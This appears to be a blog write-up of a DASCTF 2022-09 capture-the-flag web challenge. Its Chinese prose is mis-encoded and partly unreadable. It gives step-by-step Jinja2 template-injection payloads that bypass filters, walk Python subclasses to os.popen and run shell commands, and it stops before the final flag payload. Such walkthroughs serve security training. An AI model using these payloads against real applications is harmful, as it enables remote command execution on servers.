<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="aesm1p">



    <meta name="description" content="ç›¸é€¢æ„æ°”ä¸ºå›é¥®">



<title>DASCTF 2022-09 æœˆèµ›é¢˜è§£ | aesm1p&#39;s blog</title>



    <link rel="icon" href="/a.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "Â· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "Â· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">aesm1p&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">aesm1p&#39;s Blog</a><a id="mobile-toggle-theme">Â·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">DASCTF 2022-09 æœˆèµ›é¢˜è§£</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">aesm1p</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">September 18, 2022&nbsp;&nbsp;11:57:52</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/writeup/">writeup</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Text-Reverser"><a href="#Text-Reverser" class="headerlink" title="Text Reverser"></a>Text Reverser</h2><p>é¢˜ç›®ä¼šå°†æˆ‘ä»¬çš„è¾“å…¥åè½¬åè¿”å›ï¼Œè¿™é‡Œå­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œä¼šå¯¹åè½¬åçš„å†…å®¹è¿›è¡Œæ¨¡æ¿æ¸²æŸ“ã€‚ç”±äºè¿‡æ»¤äº†<code>&#123; &#123;</code>ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>&#123;% print '' %&#125;</code>æ¥ç»•è¿‡ã€‚åˆ©ç”¨pythonæ¥æ„é€ å¥½åè½¬çš„payload</p>
<p>è·å–å­ç±»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;% print ().__class__.__bases__[0].__subclasses__() %&#125;&quot;[::-1]</span><br><span class="line"># &#125;% )(__sessalcbus__.]0[__sesab__.__ssalc__.)( tnirp %&#123;</span><br></pre></td></tr></table></figure>

<img src="/2022/09/18/dasctf202209/1.png" class="">

<p>åœ¨è¿”å›çš„ç±»ä¸­æŸ¥æ‰¾å¯ä»¥å‘ç°è¿™ä¸¤ä¸ªæ•æ„Ÿç±»æ˜¯å­˜åœ¨çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#x27;os._wrap_close&#x27;&gt;,&lt;class &#x27;warnings.WarningMessage&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä½¿ç”¨çš„æ˜¯ç¬¬ä¸€ä¸ªï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦è¿™ä¸ªç±»çš„ç´¢å¼•å€¼ï¼Œè¿™é‡Œå¯ä»¥ç”¨çˆ†ç ´çš„æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥æŠŠè¿”å›çš„ç±»ä¸‹è½½ä¸‹æ¥æœ¬åœ°æœç´¢ä¸€ä¸‹ï¼Œæˆ‘ç”¨çš„æ˜¯ç¬¬äºŒç§æ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s=<span class="string">&quot;[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;_collections._tuplegetter&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;functools.singledispatchmethod&#x27;&gt;, &lt;class &#x27;functools.cached_property&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;enum.auto&#x27;&gt;, &lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;re.Pattern&#x27;&gt;, &lt;class &#x27;re.Match&#x27;&gt;, &lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;sre_parse.State&#x27;&gt;, &lt;class &#x27;sre_parse.SubPattern&#x27;&gt;, &lt;class &#x27;sre_parse.Tokenizer&#x27;&gt;, &lt;class &#x27;re.Scanner&#x27;&gt;, &lt;class &#x27;string.Template&#x27;&gt;, &lt;class &#x27;string.Formatter&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;, &lt;class &#x27;typing._Final&#x27;&gt;, &lt;class &#x27;typing._Immutable&#x27;&gt;, &lt;class &#x27;typing.Generic&#x27;&gt;, &lt;class &#x27;typing._TypingEmpty&#x27;&gt;, &lt;class &#x27;typing._TypingEllipsis&#x27;&gt;, &lt;class &#x27;typing.NamedTuple&#x27;&gt;, &lt;class &#x27;typing.io&#x27;&gt;, &lt;class &#x27;typing.re&#x27;&gt;, &lt;class &#x27;_ast.AST&#x27;&gt;, &lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;, &lt;class &#x27;__future__._Feature&#x27;&gt;, &lt;class &#x27;_json.Scanner&#x27;&gt;, &lt;class &#x27;_json.Encoder&#x27;&gt;, &lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;, &lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;, &lt;class &#x27;Struct&#x27;&gt;, &lt;class &#x27;unpack_iterator&#x27;&gt;, &lt;class &#x27;_pickle.Unpickler&#x27;&gt;, &lt;class &#x27;_pickle.Pickler&#x27;&gt;, &lt;class &#x27;_pickle.Pdata&#x27;&gt;, &lt;class &#x27;_pickle.PicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.UnpicklerMemoProxy&#x27;&gt;, &lt;class &#x27;pickle._Framer&#x27;&gt;, &lt;class &#x27;pickle._Unframer&#x27;&gt;, &lt;class &#x27;pickle._Pickler&#x27;&gt;, &lt;class &#x27;pickle._Unpickler&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;zlib.Compress&#x27;&gt;, &lt;class &#x27;zlib.Decompress&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;threading._RLock&#x27;&gt;, &lt;class &#x27;threading.Condition&#x27;&gt;, &lt;class &#x27;threading.Semaphore&#x27;&gt;, &lt;class &#x27;threading.Event&#x27;&gt;, &lt;class &#x27;threading.Barrier&#x27;&gt;, &lt;class &#x27;threading.Thread&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Compressor&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMACompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMADecompressor&#x27;&gt;, &lt;class &#x27;_sha512.sha384&#x27;&gt;, &lt;class &#x27;_sha512.sha512&#x27;&gt;, &lt;class &#x27;_random.Random&#x27;&gt;, &lt;class &#x27;weakref.finalize._Info&#x27;&gt;, &lt;class &#x27;weakref.finalize&#x27;&gt;, &lt;class &#x27;tempfile._RandomNameSequence&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileCloser&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileWrapper&#x27;&gt;, &lt;class &#x27;tempfile.SpooledTemporaryFile&#x27;&gt;, &lt;class &#x27;tempfile.TemporaryDirectory&#x27;&gt;, &lt;class &#x27;_hashlib.HASH&#x27;&gt;, &lt;class &#x27;_blake2.blake2b&#x27;&gt;, &lt;class &#x27;_blake2.blake2s&#x27;&gt;, &lt;class &#x27;_sha3.sha3_224&#x27;&gt;, &lt;class &#x27;_sha3.sha3_256&#x27;&gt;, &lt;class &#x27;_sha3.sha3_384&#x27;&gt;, &lt;class &#x27;_sha3.sha3_512&#x27;&gt;, &lt;class &#x27;_sha3.shake_128&#x27;&gt;, &lt;class &#x27;_sha3.shake_256&#x27;&gt;, &lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;, &lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;, &lt;class &#x27;dis.Bytecode&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;inspect.BlockFinder&#x27;&gt;, &lt;class &#x27;inspect._void&#x27;&gt;, &lt;class &#x27;inspect._empty&#x27;&gt;, &lt;class &#x27;inspect.Parameter&#x27;&gt;, &lt;class &#x27;inspect.BoundArguments&#x27;&gt;, &lt;class &#x27;inspect.Signature&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinStr&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinBytes&#x27;&gt;, &lt;class &#x27;urllib.parse._NetlocResultMixinBase&#x27;&gt;, &lt;class &#x27;jinja2.utils.MissingType&#x27;&gt;, &lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;, &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;, &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;, &lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;, &lt;class &#x27;jinja2.nodes.Node&#x27;&gt;, &lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;, &lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;, &lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;, &lt;class &#x27;jinja2.compiler.Frame&#x27;&gt;, &lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Context&#x27;&gt;, &lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContext&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;, &lt;class &#x27;numbers.Number&#x27;&gt;, &lt;class &#x27;ast.NodeVisitor&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;, &lt;class &#x27;jinja2.parser.Parser&#x27;&gt;, &lt;class &#x27;jinja2.environment.Environment&#x27;&gt;, &lt;class &#x27;jinja2.environment.Template&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;, &lt;class &#x27;select.poll&#x27;&gt;, &lt;class &#x27;select.epoll&#x27;&gt;, &lt;class &#x27;selectors.BaseSelector&#x27;&gt;, &lt;class &#x27;_socket.socket&#x27;&gt;, &lt;class &#x27;socketserver.BaseServer&#x27;&gt;, &lt;class &#x27;socketserver.ForkingMixIn&#x27;&gt;, &lt;class &#x27;socketserver._NoThreads&#x27;&gt;, &lt;class &#x27;socketserver.ThreadingMixIn&#x27;&gt;, &lt;class &#x27;socketserver.BaseRequestHandler&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;calendar._localized_month&#x27;&gt;, &lt;class &#x27;calendar._localized_day&#x27;&gt;, &lt;class &#x27;calendar.Calendar&#x27;&gt;, &lt;class &#x27;calendar.different_locale&#x27;&gt;, &lt;class &#x27;email._parseaddr.AddrlistClass&#x27;&gt;, &lt;class &#x27;email.charset.Charset&#x27;&gt;, &lt;class &#x27;email.header.Header&#x27;&gt;, &lt;class &#x27;email.header._ValueFormatter&#x27;&gt;, &lt;class &#x27;email._policybase._PolicyBase&#x27;&gt;, &lt;class &#x27;email.feedparser.BufferedSubFile&#x27;&gt;, &lt;class &#x27;email.feedparser.FeedParser&#x27;&gt;, &lt;class &#x27;email.parser.Parser&#x27;&gt;, &lt;class &#x27;email.parser.BytesParser&#x27;&gt;, &lt;class &#x27;email.message.Message&#x27;&gt;, &lt;class &#x27;http.client.HTTPConnection&#x27;&gt;, &lt;class &#x27;_ssl._SSLContext&#x27;&gt;, &lt;class &#x27;_ssl._SSLSocket&#x27;&gt;, &lt;class &#x27;_ssl.MemoryBIO&#x27;&gt;, &lt;class &#x27;_ssl.Session&#x27;&gt;, &lt;class &#x27;ssl.SSLObject&#x27;&gt;, &lt;class &#x27;mimetypes.MimeTypes&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;traceback.TracebackException&#x27;&gt;, &lt;class &#x27;logging.LogRecord&#x27;&gt;, &lt;class &#x27;logging.PercentStyle&#x27;&gt;, &lt;class &#x27;logging.Formatter&#x27;&gt;, &lt;class &#x27;logging.BufferingFormatter&#x27;&gt;, &lt;class &#x27;logging.Filter&#x27;&gt;, &lt;class &#x27;logging.Filterer&#x27;&gt;, &lt;class &#x27;logging.PlaceHolder&#x27;&gt;, &lt;class &#x27;logging.Manager&#x27;&gt;, &lt;class &#x27;logging.LoggerAdapter&#x27;&gt;, &lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;, &lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;, &lt;class &#x27;urllib.request.Request&#x27;&gt;, &lt;class &#x27;urllib.request.OpenerDirector&#x27;&gt;, &lt;class &#x27;urllib.request.BaseHandler&#x27;&gt;, &lt;class &#x27;urllib.request.HTTPPasswordMgr&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractBasicAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractDigestAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.URLopener&#x27;&gt;, &lt;class &#x27;urllib.request.ftpwrapper&#x27;&gt;, &lt;class &#x27;http.cookiejar.Cookie&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookiePolicy&#x27;&gt;, &lt;class &#x27;http.cookiejar.Absent&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookieJar&#x27;&gt;&quot;</span></span><br><span class="line">l = s.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> l:</span><br><span class="line">    a.append(re.findall(<span class="string">r&#x27;\&#x27;(\S+)\&#x27;&#x27;</span>, e)[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(a.index(<span class="string">&#x27;os._wrap_close&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œä»£ç å¾—åˆ°ç´¢å¼•å€¼ä¸º132ï¼Œæ¥ä¸‹æ¥æŸ¥çœ‹å…¨å±€å˜é‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;% print ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__ %&#125;&quot;[::-1]</span><br><span class="line">#payload: &#125;% __slabolg__.__tini__.]231[)(__sessalcbus__.]0[__sesab__.__ssalc__.)( tnirp %&#123;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿”å›çš„æ•°ç»„ä¸­å‘ç°æœ‰popenï¼Œé‚£ä¹ˆåˆ©ç”¨è¿™ä¸ªç±»æ‰§è¡Œå‘½ä»¤å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;% print ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](\&quot;ls /\&quot;).read() %&#125;&quot;[::-1]</span><br><span class="line">#: &#125;% )(daer.)&quot;/ sl&quot;(]&#x27;nepop&#x27;[__slabolg__.__tini__.]231[)(__sessalcbus__.]0[__sesab__.__ssalc__.)( tnirp %&#123;</span><br></pre></td></tr></table></figure>

<img src="/2022/09/18/dasctf202209/2.png" class="">

<p>æ¥ä¸‹æ¥æŸ¥æ‰¾æ‹¿flagå³å¯ï¼Œè¿™é‡Œè¿‡æ»¤catï¼Œå¯ä»¥ä½¿ç”¨tailç»•è¿‡ï¼Œæœ€ç»ˆpayload(è¦å»æ‰åæ–œæ )</p>
